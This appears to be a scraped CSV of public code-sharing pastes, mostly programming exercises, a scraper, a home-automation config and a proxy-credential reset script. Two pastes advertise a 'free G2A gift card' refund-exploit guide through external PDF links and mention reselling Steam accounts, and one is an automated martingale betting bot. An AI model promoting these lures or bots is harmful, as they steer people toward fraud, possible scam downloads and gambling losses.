id,title,username,language,date,content
uyr9uADg,03. New House,GabrielHr00,Java,Sunday 24th of March 2024 06:24:55 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class NewHouse {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        String flowerType = scanner.nextLine();
        int flowerCount = Integer.parseInt(scanner.nextLine());
        int budget = Integer.parseInt(scanner.nextLine());

        double finalSum = 0.0;

        switch (flowerType) {
            case ""Roses"":
                finalSum = 5.0 * flowerCount;
                if (flowerCount > 80) {
                    finalSum = finalSum * 0.90;
                    //finalSum = finalSum - (finalSum * 0.10);
                    // finalSum *= 0.90;
                }
                break;
            case ""Dahlias"":
                finalSum = 3.80 * flowerCount;
                if (flowerCount > 90) {
                    finalSum = finalSum * 0.85;
                }
                break;
            case ""Tulips"":
                finalSum = 2.8 * flowerCount;
                if (flowerCount > 80) {
                    finalSum = finalSum * 0.85;
                }
                break;
            case ""Narcissus"":
                finalSum = 3.0 * flowerCount;
                if (flowerCount < 120) {
                    finalSum = finalSum * 1.15;
                }
                break;
            case ""Gladiolus"":
                finalSum = 2.50 * flowerCount;
                if (flowerCount < 80) {
                    finalSum = finalSum * 1.20;
                }
                break;
        }


        double diff = Math.abs(budget - finalSum);
        if (budget >= finalSum) {
            System.out.printf(""Hey, you have a great garden with %d %s and %.2f leva left."",
                    flowerCount, flowerType, diff);
        } else {
            System.out.printf(""Not enough money, you need %.2f leva more."", diff);
        }

    }
}
"
EqA2Acwp,02. Summer Outfit,GabrielHr00,Java,Sunday 24th of March 2024 06:24:14 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class SummerOutfit {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        int degrees = Integer.parseInt(scanner.nextLine());
        String dayTime = scanner.nextLine();

        String outfit = """";
        String shoes = """";

        if (dayTime.equals(""Morning""))
        {
            if (degrees >= 10 && degrees <= 18) {
                outfit = ""Sweatshirt"";
                shoes = ""Sneakers"";
            } else if (degrees > 18 && degrees <= 24) {
                outfit = ""Shirt"";
                shoes = ""Moccasins"";
            } else if (degrees >= 25) {
                outfit = ""T-Shirt"";
                shoes = ""Sandals"";
            }
        }
        else if (dayTime.equals(""Afternoon""))
        {
            if (degrees >= 10 && degrees <= 18) {
                outfit = ""Shirt"";
                shoes = ""Moccasins"";
            } else if (degrees > 18 && degrees <= 24) {
                outfit = ""T-Shirt"";
                shoes = ""Sandals"";
            } else if (degrees >= 25) {
                outfit = ""Swim Suit"";
                shoes = ""Barefoot"";
            }
        } else if (dayTime.equals(""Evening""))
        {
            if (degrees >= 10 && degrees <= 18) {
                outfit = ""Shirt"";
                shoes = ""Moccasins"";
            } else if (degrees > 18 && degrees <= 24) {
                outfit = ""Shirt"";
                shoes = ""Moccasins"";
            } else if (degrees >= 25) {
                outfit = ""Shirt"";
                shoes = ""Moccasins"";
            }
        }

        System.out.printf(""It's %d degrees, get your %s and %s."", degrees, outfit, shoes);

    }
}"
sp0njhzu,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,ounnuo,GetText,Sunday 24th of March 2024 06:24:12 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_550343.pdf

Working as of:
24 March 2024


















"
brUxqM0h,01. Cinema,GabrielHr00,Java,Sunday 24th of March 2024 06:23:33 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class Cinema {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        String ticketType = scanner.nextLine();
        int rows = Integer.parseInt(scanner.nextLine());
        int columns = Integer.parseInt(scanner.nextLine());

        int seatsAll = rows * columns;
        double totalPrice = 0.0;

//        if (ticketType.equals(""Premiere"")) {
//            totalPrice = 12.0 * seatsAll;
//        } else if (ticketType.equals(""Normal"")) {
//            totalPrice = 7.50 * seatsAll;
//        } else if (ticketType.equals(""Discount"")) {
//            totalPrice = 5.0 * seatsAll;
//        }

        switch (ticketType) {
            case ""Premiere"":
                totalPrice = 12.0 * seatsAll;
                break;
            case ""Normal"":
                totalPrice = 7.50 * seatsAll;
                break;
            case ""Discount"":
                totalPrice = 5.0 * seatsAll;
                break;
        }

        System.out.printf(""%.2f leva"", totalPrice);

    }
}
"
s0aB1MTv,Untitled,dereksir,C#,Sunday 24th of March 2024 06:06:41 AM CDT,"// import the required libraries
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;

public class Example
{
    static void Main(string[] args)
    {
        // set ChromeOptions to run in headless mode
        ChromeOptions options = new ChromeOptions();
        options.AddArgument(""--headless"");

        // set up ChromeDriver
        IWebDriver driver = new ChromeDriver(options);

        // navigate to the target url
        string target_url = ""https://scrapeme.live/shop/Pikachu/"";
        driver.Navigate().GoToUrl(target_url);

        // find the element containing the product price
        IWebElement priceElement = driver.FindElement(By.CssSelector(""#product-752 > div.summary.entry-summary > p.price > span""));

        // extract the text of the product price
        string productPrice = priceElement.Text;

        // print the extracted product price
        Console.WriteLine(""Product Price: "" + productPrice);

        // close the browser
        driver.Quit();
    }
}"
p0mdFDvC,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Sunday 24th of March 2024 06:03:58 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
24 March 2024















































"
N44nvbtQ,snowybot,coinwalk,JavaScript,Sunday 24th of March 2024 05:59:43 AM CDT,"var olsenest = parseFloat(document.getElementById('pct_balance').value);
var monkey = Number((olsenest/1000).toFixed(7));
var bolux = monkey;
var tens = (monkey*10);
var sevens = (monkey*6.9);
var eights = (monkey*7.9);
var feeble = ((Math.floor(olsenest/tens))*tens);
var olsen = parseFloat(feeble);
var awesome = parseFloat(feeble);
var whare = olsenest;
var upper = 6.9;
var downer = 2.9;
var belance = olsenest;
var fart = 4;
 
 
function soiled(){
belance = document.getElementById('pct_balance').value;
feeble = ((Math.floor(belance/tens))*tens);
if (belance>(olsen+(bolux*upper))){
    bolux = bolux*2;
    upper = 4.9;
    downer = 4.9;
    fran = false;
    olsen = parseFloat(belance);
}
if ((belance<(olsen-(bolux*downer)))&&(fran)){
    bolux = bolux*2;
    upper = 4.9;
    downer = 4.9;
    fran = false;
    olsen = parseFloat(belance);
}
if ((belance<(olsen-(bolux*downer)))&&(!fran)){
    upper = 4.9;
    downer = 4.9;
    fran = true;
    olsen = parseFloat(belance);
}
if ((((belance/300)-bolux)<=0)&&(belance<(feeble+sevens))&&(belance<whare)){
    bolux = monkey;
    upper = 6.9;
    downer = 2.9;
    fart = 0;
    fran = true;
    olsen = parseFloat(feeble);
    whare =  parseFloat(belance);
}
if ((belance>(awesome*1.044))&&(belance<(feeble+sevens))){
    monkey = Number(((parseFloat(belance))/100).toFixed(7));
    tens = (monkey*10);
    sevens = (monkey*6.9);
    eights = (monkey*7.9);
    bolux = monkey;
    upper = 6.9;
    downer = 2.9;
    fart = 4;
    olsen = parseFloat(feeble);
    whare =  parseFloat(belance);
    awesome = parseFloat(feeble);
}
if (belance>=(14400)){
console.log(""winner winner chicken dinner"");
return;
}
var dog = ((belance-olsenest).toFixed(8));
console.log(""profit"");
console.log(dog);
$('#pct_chance').val(49.5);
$('#pct_bet').val(((bolux*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() =>soiled(), 1);
}
soiled();"
8hdRY8ZM,Untitled,Josif_tepe,C++,Sunday 24th of March 2024 05:54:33 AM CDT,"#include <iostream>
#include <algorithm>
using namespace std;

int main() {
    int n;
    cin >> n;
    
    int niza[n];
    for(int i = 0; i < n; i++) {
        cin >> niza[i];
    }
    sort(niza, niza + n);
    int S = 0;
    int E = n - 1;
    int res = 0;
    while(S < E) {
        while(niza[S] > 0 and S < E) {
            E--;
            niza[S]--;
            res++;
        }
        S++;
    }
    cout << res << endl;
    return 0;
}
"
rUpCsyJ5,Auto Reset Proxy,ngatmuri,PHP,Sunday 24th of March 2024 05:52:28 AM CDT,"<?php
$token ='';
$url = 'https://account.ipvanish.com/api-v4/proxy-credentials/reset';
$curl = curl_init($url);

$headers = [
    'authority: account.ipvanish.com',
    'method: POST',
    'path: /api-v4/proxy-credentials/reset',
    'scheme: https',
    'Accept: */*',
    //'Accept-Encoding: gzip, deflate, br, zstd',
    'Accept-Language: en-US,en;q=0.9,id;q=0.8',
    'Authorization: '.$token,
    'Origin: https://my.ipvanish.com',
    'Referer: https://my.ipvanish.com/',
    'Sec-Ch-Ua: ""Chromium"";v=""122"", ""Not(A:Brand"";v=""24"", ""Google Chrome"";v=""122""',
    'Sec-Ch-Ua-Mobile: ?1',
    'Sec-Ch-Ua-Platform: ""Android""',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-site',
    'User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
];

curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_POST, true);
//curl_setopt($curl, CURLOPT_POSTFIELDS,json_encode($post_data) );
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE); 



$response = curl_exec($curl); 
$json = $response;
$obj = json_decode($json);

//print_r($obj);
echo $obj->proxyUsername.':'.$obj->proxyPassword;

?>"
LS6yFKjU,Untitled,LA_,YAML,Sunday 24th of March 2024 05:43:29 AM CDT,"- id: leak_sensors_unavailable_notification
  alias: Уведомление в telegram об исчезновении связи с датчиками протечки
  description: ''
  trigger:
  - platform: time_pattern
    hours: '19'
  condition:
  - condition: and
    conditions:
    - condition: template
      value_template: '{{ now().day == 24 }}'
    - condition: or
      conditions:
      - condition: template
        value_template: '{{ states(''sensor.water_leak_toilet_sink_battery'') == ''unknown''
          }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_kitchen_dishwasher_battery'')
          == ''unknown'' }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_kitchen_sink_battery'') ==
          ''unknown'' }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_washer_battery'') == ''unknown''
          }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_bathroom_sink_battery'') ==
          ''unknown'' }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_toilet_riser_battery'') ==
          ''unknown'' }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_kitchen_riser_battery'') ==
          ''unknown'' }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_bathroom_tub_battery'') ==
          ''unknown'' }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_commutator_battery'') == ''unknown''
          }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_bathroom_riser_battery'') ==
          ''unknown'' }}'
  action:
  - service: notify.telegram_id
    data:
      message: |
        Недоступные датчики протечки:
        {% set water_leaks = ['sensor.water_leak_toilet_sink_battery', 'sensor.water_leak_kitchen_dishwasher_battery', 'sensor.water_leak_kitchen_sink_battery', 'sensor.water_leak_washer_battery', 'sensor.water_leak_bathroom_sink_battery', 'sensor.water_leak_toilet_riser_battery', 'sensor.water_leak_kitchen_riser_battery', 'sensor.water_leak_bathroom_tub_battery', 'sensor.water_leak_commutator_battery', 'sensor.water_leak_bathroom_riser_battery'] %}
        {% for wl in water_leaks %}{% if states(wl) == 'unknown' %}{{ wl }}, {% endif %}{% endfor %}
  mode: single"
66JeJYcT,Untitled,Josif_tepe,C++,Sunday 24th of March 2024 05:18:39 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int t, strana;
    cin >> t >> strana;
    
    int s = 1, e = 4 * t;
    for(int i = 0; i < t; i++) {
        if(s == strana) {
            cout << s + 1 << "" "" << e - 1 << "" "" << e << endl;
        }
        else if(s + 1 == strana) {
            cout << s << "" "" << e - 1 << "" "" << e << endl;
        }
        else if(e - 1 == strana) {
            cout << s << "" "" << s + 1 << "" "" << e << endl;
        }
        else if(e == strana) {
            cout << s << "" "" << s + 1 << "" "" << e - 1 << endl;
        }
        
        s += 2;
        e -= 2;
    }
    
    
    return 0;
}
"
MUBLNVqb,map,LEGEND2004,C++,Sunday 24th of March 2024 04:59:41 AM CDT,"//https://cplusplus.com/reference/map/map/?kw=map
#pragma GCC optimize(""O3"")
#include <bits/stdc++.h>
using namespace std;

#define int long long
#define fastio ios_base::sync_with_stdio(0); cin.tie(0)

signed main()
{
    fastio;

    /*map<string , string> mp;
    mp[""AC""] = ""Accepted"";
    mp[""WA""] = ""Wrong Answer"";
    cout << mp[""AC""] << '\n'; //
    cout << mp.size() << '\n'; //
    cout << mp[""TLE""] << '\n';
    cout << mp.size() << '\n';
    mp[""AA""] = ""BB"";
    for(auto i : mp){
        cout << i.first << "" "" << i.second << '\n';
    }*/
    map<string , vector<string> > v;
    v[""AC""].push_back(""Accepted"");
    v[""AC""].push_back(""100%"");
    for(auto i : v[""AC""]){
        cout << i << "" "";
    }
    /*

    {""AC"" , ""Accepted""}
    {""TLE"" , """"}
    {""WA"" , ""Wrong Answer""}

    8
    1 2 2 3 4 4 3 3 105

    {1 , 1}
    {2 , 2}
    {3 , 3}
    {4 , 2}
    {105 , 1}

    */
}
"
zP5vznUU,Untitled,Josif_tepe,C++,Sunday 24th of March 2024 04:42:15 AM CDT,"class Solution
{
    public:
    //Function to return a list of integers denoting the node
    //values of both the BST in a sorted order.
    vector<int> v1, v2;
    void dfs(Node *root, int t) {
        if(!root) {
            return;
        }
        dfs(root->left, t);
        if(t == 1) {
            v1.push_back(root->data);
        }
        else {
            v2.push_back(root->data);
        }
        dfs(root->right, t);
    }
    vector<int> merge(Node *root1, Node *root2)
    {
        dfs(root1, 1);
        dfs(root2, 2);
        
        vector<int> v;
        int i = 0,  j = 0;
        while(i < (int) v1.size() and j < (int) v2.size()) {
            if(v1[i] < v2[j]) {
                v.push_back(v1[i]);
                i++;
            }
            else if(v1[i] > v2[j]) {
                v.push_back(v2[j]);
                j++;
            }
            else {
                v.push_back(v1[i]);
                v.push_back(v1[i]);
                i++;
                j++;
            }
        }
        while(i < (int) v1.size()) {
            v.push_back(v1[i]);
            i++;
        }
        while(j < (int) v2.size()) {
            v.push_back(v2[j]);
            j++;
        }
        return v;
    }
};"
